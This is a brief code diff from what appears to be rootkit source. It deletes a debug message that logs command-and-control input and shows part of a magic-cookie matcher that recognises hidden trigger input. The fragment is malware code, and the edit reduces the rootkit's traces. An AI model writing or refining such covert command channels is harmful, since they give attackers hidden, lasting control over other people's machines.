@@ -169,8 +169,6 @@ void accept_param_input (char input)
 void
 accept_input (char input)
 {
-	ROOTKIT_DEBUG("C&C input detected: '%u'\n", input);	
-
 	if(state == 0) {
 		
 		if(magic_cookie[cstate] == input) {
